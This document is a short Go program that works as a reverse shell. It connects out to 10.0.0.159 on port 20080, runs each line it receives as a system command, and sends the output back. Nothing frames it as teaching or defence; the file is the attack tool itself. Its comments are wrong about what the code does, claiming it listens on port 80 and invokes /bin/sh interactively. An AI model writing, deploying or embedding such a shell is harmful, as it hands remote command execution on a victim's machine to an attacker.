package main

import (
	"net"
	"bufio"
	"os/exec"
	"fmt"
	"strings"
)	

func main() {
	// Listen on local port 80
	conn, _ := net.Dial("tcp", "10.0.0.159:20080")
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").
	for{
		message, _ := bufio.NewReader(conn).ReadString('\n')
		
		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}
		fmt.Fprintf(conn, "%s\n", out) 
	}
}


	